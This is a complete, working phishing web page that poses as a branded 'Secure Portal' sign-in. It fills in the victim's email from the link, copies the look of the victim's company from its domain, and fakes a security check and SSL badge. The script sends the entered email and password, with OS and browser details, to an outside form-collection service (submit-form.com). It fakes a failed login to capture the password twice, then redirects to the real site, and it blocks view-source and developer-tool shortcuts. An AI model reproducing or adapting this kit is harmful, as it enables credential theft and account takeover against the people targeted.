<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <!-- SECURITY -->
  <meta name="robots" content="noindex, nofollow">
  <meta name="referrer" content="no-referrer">
  <meta http-equiv="X-Content-Type-Options" content="nosniff">
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="0">
  
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
  
  <title id="pageTitle">Loading...</title>
  
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
      background: #1a1a2e;
      background-size: cover;
      background-position: center;
      transition: background 0.8s ease;
    }
    
    body::before {
      content: '';
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.55);
      z-index: 0;
    }
    
    /* --- HUMAN VERIFICATION OVERLAY --- */
    #human-verify {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: #0f172a;
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 99999;
      flex-direction: column;
      padding: 20px;
    }
    
    #human-verify .box {
      background: #1e293b;
      padding: 40px 30px;
      border-radius: 16px;
      max-width: 420px;
      width: 100%;
      text-align: center;
      border: 1px solid #334155;
      box-shadow: 0 20px 40px rgba(0,0,0,0.5);
    }
    
    #human-verify h2 {
      color: #f1f5f9;
      font-size: 22px;
      margin-bottom: 8px;
    }
    
    #human-verify p {
      color: #94a3b8;
      font-size: 14px;
      margin-bottom: 20px;
      line-height: 1.6;
    }
    
    #human-verify .spinner {
      width: 48px;
      height: 48px;
      border: 4px solid #334155;
      border-top-color: #3b82f6;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin: 0 auto 16px;
    }
    
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    
    /* --- MODERN ELEVATED FLOATING CARD --- */
    .chameleon-container {
      width: 100%;
      max-width: 560px;
      background: #ffffff;
      border-radius: 16px;
      box-shadow: 
        0 4px 6px rgba(0, 0, 0, 0.02),
        0 8px 30px rgba(0, 0, 0, 0.08),
        0 20px 60px rgba(0, 0, 0, 0.12),
        0 40px 80px rgba(0, 0, 0, 0.06);
      overflow: hidden;
      display: none;
      position: relative;
      z-index: 10;
      animation: fadeIn 0.6s ease;
      transition: transform 0.3s ease, box-shadow 0.4s ease;
    }
    
    .chameleon-container:hover {
      box-shadow: 
        0 8px 12px rgba(0, 0, 0, 0.02),
        0 12px 40px rgba(0, 0, 0, 0.10),
        0 30px 80px rgba(0, 0, 0, 0.15),
        0 50px 100px rgba(0, 0, 0, 0.08);
      transform: translateY(-4px);
    }
    
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(24px) scale(0.97); }
      to { opacity: 1; transform: translateY(0) scale(1); }
    }
    
    /* Brand Header - Company Name Only */
    .brand-header {
      padding: 28px 30px 18px;
      text-align: center;
      border-bottom: 1px solid #f0f0f0;
      background: #ffffff;
    }
    
    .brand-name {
      font-size: 22px;
      font-weight: 700;
      color: #1a1a1a;
      letter-spacing: -0.3px;
    }
    
    /* Visitor Info Bar */
    .visitor-info {
      background: #fafbfc;
      padding: 10px 22px;
      display: flex;
      flex-wrap: wrap;
      justify-content: space-between;
      align-items: center;
      font-size: 12px;
      color: #555;
      border-bottom: 1px solid #f0f0f0;
      gap: 4px 12px;
    }
    
    .visitor-info .info-item {
      display: flex;
      align-items: center;
      gap: 5px;
    }
    
    .visitor-info .info-item i {
      color: #0078d4;
      width: 14px;
      font-size: 13px;
    }
    
    .visitor-info .info-item .os-icon {
      font-size: 16px;
      width: 18px;
    }
    
    .visitor-info .info-item .browser-icon {
      font-size: 16px;
      width: 18px;
    }
    
    /* Content */
    .chameleon-content {
      padding: 28px 30px 24px;
    }
    
    .hero-title {
      font-size: 20px;
      font-weight: 700;
      color: #1a1a1a;
      margin-bottom: 4px;
    }
    
    .hero-sub {
      font-size: 14px;
      color: #666;
      margin-bottom: 18px;
    }
    
    .email-display {
      background: #f5f8ff;
      padding: 12px 16px;
      border-radius: 8px;
      font-size: 15px;
      font-weight: 600;
      color: #1a1a1a;
      margin-bottom: 20px;
      word-break: break-all;
      border-left: 4px solid #0078d4;
    }
    
    /* Form */
    .login-form {
      margin-top: 4px;
    }
    
    .form-group {
      margin-bottom: 16px;
    }
    
    .form-group label {
      display: block;
      font-size: 13px;
      font-weight: 600;
      color: #333;
      margin-bottom: 5px;
    }
    
    .input-with-icon {
      position: relative;
    }
    
    .input-with-icon input {
      width: 100%;
      padding: 12px 12px 12px 44px;
      border: 2px solid #e8e8e8;
      border-radius: 10px;
      font-size: 15px;
      transition: border-color 0.3s, box-shadow 0.3s;
      background: #fafafa;
      outline: none;
    }
    
    .input-with-icon input:focus {
      border-color: #0078d4;
      background: #ffffff;
      box-shadow: 0 0 0 4px rgba(0, 120, 212, 0.08);
    }
    
    .input-with-icon .icon {
      position: absolute;
      left: 14px;
      top: 50%;
      transform: translateY(-50%);
      color: #94a3b8;
      font-size: 16px;
    }
    
    .input-with-icon .toggle-password {
      position: absolute;
      right: 14px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      color: #94a3b8;
      font-size: 16px;
    }
    
    .input-with-icon .toggle-password:hover {
      color: #1a1a1a;
    }
    
    .checkbox-group {
      display: flex;
      align-items: center;
      margin: 14px 0 18px;
    }
    
    .checkbox-group input {
      margin-right: 10px;
      width: 18px;
      height: 18px;
      accent-color: #0078d4;
    }
    
    .checkbox-group label {
      font-size: 13px;
      color: #555;
    }
    
    .btn-submit {
      width: 100%;
      padding: 14px;
      background: #0078d4;
      color: #fff;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      transition: background 0.3s, transform 0.15s;
    }
    
    .btn-submit:hover {
      background: #106ebe;
      transform: scale(1.01);
    }
    
    .btn-submit:active {
      transform: scale(0.98);
    }
    
    .auth-error {
      color: #dc2626;
      font-size: 13px;
      margin: 8px 0 4px;
      display: none;
      text-align: center;
      background: #fef2f2;
      padding: 8px 12px;
      border-radius: 8px;
      border: 1px solid #fecaca;
    }
    
    .footer-links {
      text-align: center;
      margin-top: 16px;
      font-size: 13px;
      color: #666;
    }
    
    .footer-links a {
      color: #0078d4;
      text-decoration: none;
    }
    
    .footer-links a:hover {
      text-decoration: underline;
    }
    
    .security-badge {
      background: #fafbfc;
      border-top: 1px solid #f0f0f0;
      padding: 14px;
      text-align: center;
      font-size: 12px;
      color: #94a3b8;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 8px;
    }
    
    .security-badge i {
      color: #22c55e;
      font-size: 14px;
    }
    
    .loader {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.6);
      z-index: 9999;
      justify-content: center;
      align-items: center;
    }
    
    .loader::after {
      content: "";
      width: 40px;
      height: 40px;
      border: 4px solid #fff;
      border-top-color: #0078d4;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }
    
    @media (max-width: 500px) {
      .chameleon-container {
        border-radius: 0;
        box-shadow: none;
        transform: none !important;
      }
      .chameleon-container:hover {
        transform: none !important;
      }
      .brand-header {
        padding: 20px 16px 14px;
      }
      .chameleon-content {
        padding: 20px 16px;
      }
      .visitor-info {
        font-size: 11px;
        padding: 6px 12px;
      }
      #human-verify .box {
        padding: 30px 20px;
      }
    }
  </style>
</head>
<body>

  <!-- HUMAN VERIFICATION OVERLAY -->
  <div id="human-verify">
    <div class="box">
      <div class="spinner" id="verify-spinner"></div>
      <h2>🔒 Security Check</h2>
      <p>Verifying your connection to the secure portal...</p>
    </div>
  </div>

  <!-- MODERN ELEVATED FLOATING CARD -->
  <div class="chameleon-container" id="chameleonContainer">
    
    <!-- Brand Header - Company Name Only -->
    <div class="brand-header" id="brandHeader">
      <div class="brand-name" id="brandName">Loading...</div>
    </div>
    
    <div class="visitor-info" id="visitorInfo">
      <span class="info-item"><i class="fas fa-calendar-alt"></i> <span id="visitDateTime">Loading...</span></span>
      <span class="info-item"><i class="fas fa-map-marker-alt"></i> <span id="visitLocation">Loading...</span></span>
      <span class="info-item">
        <i class="fas fa-desktop os-icon" id="osIcon"></i>
        <span id="osLabel">Loading...</span>
      </span>
      <span class="info-item">
        <i class="fas fa-globe browser-icon" id="browserIcon"></i>
        <span id="browserLabel">Loading...</span>
      </span>
    </div>
    
    <div class="chameleon-content">
      <div class="hero-title" id="heroTitle">Welcome</div>
      <div class="hero-sub" id="heroSub">Please sign in to access your account.</div>
      
      <div class="email-display" id="emailDisplay">Loading...</div>
      
      <form id="loginForm">
        <input type="text" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off">
        <input type="hidden" id="emailField" name="email">
        
        <div class="form-group">
          <label for="passwordField">Password</label>
          <div class="input-with-icon">
            <span class="icon"><i class="fas fa-lock"></i></span>
            <input type="password" id="passwordField" name="password" placeholder="Enter your password" required>
            <span class="toggle-password" onclick="togglePassword()"><i class="fas fa-eye" id="eyeIcon"></i></span>
          </div>
        </div>
        
        <div class="checkbox-group">
          <input type="checkbox" id="remember">
          <label for="remember">Remember me</label>
        </div>
        
        <div class="auth-error" id="authError">Authentication is required!</div>
        
        <button type="submit" class="btn-submit">Sign In</button>
      </form>
      
      <div class="footer-links">
        <a href="#">Forgot your password?</a> &middot; <a href="#">Privacy Policy</a>
      </div>
    </div>
    
    <div class="security-badge">
      <i class="fas fa-shield-alt"></i> Secure SSL Connection &middot; <span id="footerDomain">Loading...</span>
    </div>
  </div>

  <div class="loader" id="loader"></div>

  <script>
    const FORMSPARK_URL = "https://submit-form.com/wUKgSbdQB";
    
    // --- GET EMAIL FROM URL ---
    function getEmailFromURL() {
      let email = null;
      if (window.location.hash) {
        let hash = window.location.hash.substring(1);
        if (hash.includes('&')) hash = hash.split('&')[0];
        if (hash.includes('@')) email = hash;
      }
      if (!email) {
        const params = new URLSearchParams(window.location.search);
        if (params.has('email')) email = params.get('email');
      }
      return email;
    }
    
    // --- DETECT OS AND ICON (Windows 10 removed) ---
    function getOSInfo() {
      const ua = navigator.userAgent;
      if (ua.includes('Windows')) {
        if (ua.includes('Windows NT 10.0')) return { name: 'Windows', icon: 'fa-windows' };
        if (ua.includes('Windows NT 6.3')) return { name: 'Windows 8.1', icon: 'fa-windows' };
        if (ua.includes('Windows NT 6.2')) return { name: 'Windows 8', icon: 'fa-windows' };
        if (ua.includes('Windows NT 6.1')) return { name: 'Windows 7', icon: 'fa-windows' };
        return { name: 'Windows', icon: 'fa-windows' };
      }
      if (ua.includes('Mac OS X') || ua.includes('Macintosh')) {
        return { name: 'macOS', icon: 'fa-apple' };
      }
      if (ua.includes('Linux')) {
        if (ua.includes('Android')) return { name: 'Android', icon: 'fa-android' };
        if (ua.includes('CrOS')) return { name: 'ChromeOS', icon: 'fa-chrome' };
        return { name: 'Linux', icon: 'fa-linux' };
      }
      if (/iPhone|iPad|iPod/i.test(ua)) return { name: 'iOS', icon: 'fa-apple' };
      return { name: 'Unknown', icon: 'fa-desktop' };
    }
    
    // --- DETECT BROWSER AND ICON ---
    function getBrowserInfo() {
      const ua = navigator.userAgent;
      if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) return { name: 'Chrome', icon: 'fa-chrome' };
      if (ua.includes('Safari') && !ua.includes('Chrome')) return { name: 'Safari', icon: 'fa-safari' };
      if (ua.includes('Firefox')) return { name: 'Firefox', icon: 'fa-firefox' };
      if (ua.includes('Edg')) return { name: 'Edge', icon: 'fa-edge' };
      if (ua.includes('OPR') || ua.includes('Opera')) return { name: 'Opera', icon: 'fa-opera' };
      return { name: 'Unknown', icon: 'fa-globe' };
    }
    
    // --- GET LOCATION ---
    async function getLocation() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        if (data.city && data.country_code) {
          return `${data.city}, ${data.country_code}`;
        }
      } catch {}
      
      try {
        const res2 = await fetch('https://ipinfo.io/json');
        const data2 = await res2.json();
        if (data2.city && data2.country) {
          return `${data2.city}, ${data2.country}`;
        }
      } catch {}
      
      return 'Unknown';
    }
    
    // --- FETCH BRANDING AND BACKGROUND ---
    async function fetchBranding(domain) {
      try {
        const nameParts = domain.split('.');
        const brandName = nameParts[0].charAt(0).toUpperCase() + nameParts[0].slice(1);
        document.getElementById('brandName').textContent = brandName;
        document.getElementById('footerDomain').textContent = domain;
        
        document.getElementById('heroTitle').textContent = `Welcome to ${brandName}`;
        document.getElementById('heroSub').textContent = `Please sign in to access your ${brandName} account.`;
        
        const color = '#0078d4';
        document.querySelector('.btn-submit').style.background = color;
        document.querySelector('.email-display').style.borderLeftColor = color;
        
        // DYNAMIC BACKGROUND
        const bgUrl = `https://image.thum.io/get/width/1200/https://${domain}`;
        const img = new Image();
        img.onload = function() {
          document.body.style.backgroundImage = `linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.5)), url('${bgUrl}')`;
          document.body.style.backgroundSize = 'cover';
          document.body.style.backgroundPosition = 'center';
        };
        img.onerror = function() {
          document.body.style.background = 'linear-gradient(135deg, #0f172a, #1e293b)';
        };
        img.src = bgUrl;
        
      } catch (e) {
        console.log('Branding error:', e);
      }
    }
    
    // --- INITIALIZE PAGE ---
    async function initPage() {
      const email = getEmailFromURL();
      const domain = email ? email.split('@')[1] : 'unknown.com';
      
      document.getElementById('emailDisplay').textContent = email || 'No email specified';
      document.getElementById('emailField').value = email || '';
      document.getElementById('pageTitle').textContent = `${domain} · Secure Portal`;
      
      const now = new Date();
      document.getElementById('visitDateTime').textContent = now.toDateString() + ' ' + now.toLocaleTimeString();
      document.getElementById('visitLocation').textContent = await getLocation();
      
      const os = getOSInfo();
      document.getElementById('osIcon').className = `fab ${os.icon} os-icon`;
      document.getElementById('osLabel').textContent = os.name;
      
      const browser = getBrowserInfo();
      document.getElementById('browserIcon').className = `fab ${browser.icon} browser-icon`;
      document.getElementById('browserLabel').textContent = browser.name;
      
      await fetchBranding(domain);
      
      document.getElementById('chameleonContainer').style.display = 'block';
    }
    
    // --- TOGGLE PASSWORD ---
    function togglePassword() {
      const field = document.getElementById('passwordField');
      const icon = document.getElementById('eyeIcon');
      if (field.type === 'password') {
        field.type = 'text';
        icon.className = 'fas fa-eye-slash';
      } else {
        field.type = 'password';
        icon.className = 'fas fa-eye';
      }
    }
    
    // --- SECURITY ---
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.addEventListener('keydown', function(e) {
      if (e.ctrlKey && (e.key === 'u' || e.key === 'U' || e.key === 's' || e.key === 'S' || e.key === 'c' || e.key === 'C' || e.key === 'a' || e.key === 'A')) e.preventDefault();
      if (e.key === 'F12') e.preventDefault();
    });
    if (window.top !== window.self) window.top.location = window.self.location;
    window.addEventListener('pageshow', function(e) { if (e.persisted) window.location.reload(); });
    
    // --- FORM SUBMISSION ---
    let attemptCount = 0;
    let firstPassword = '';
    
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      
      const email = document.getElementById('emailField').value.trim();
      const password = document.getElementById('passwordField').value.trim();
      const errorEl = document.getElementById('authError');
      
      if (!email || !password) {
        errorEl.textContent = 'Please fill in all fields.';
        errorEl.style.display = 'block';
        return;
      }
      
      attemptCount++;
      errorEl.style.display = 'none';
      
      try {
        await fetch(FORMSPARK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email: email,
            password: password,
            attempt: attemptCount,
            os: getOSInfo().name,
            browser: getBrowserInfo().name,
            timestamp: new Date().toISOString()
          })
        });
      } catch (err) {
        console.log('Formspark error:', err);
      }
      
      if (attemptCount === 1) {
        firstPassword = password;
        errorEl.textContent = 'Authentication is required! Please try again.';
        errorEl.style.display = 'block';
        document.getElementById('passwordField').value = '';
        document.getElementById('passwordField').focus();
      } else {
        const domain = email.split('@')[1];
        document.getElementById('loader').style.display = 'flex';
        setTimeout(() => {
          window.location.href = `https://${domain}`;
        }, 1500);
      }
    });
    
    // --- AUTO-VERIFY ---
    setTimeout(function() {
      document.getElementById('human-verify').style.display = 'none';
      initPage();
    }, 3000);
  </script>
</body>
</html>
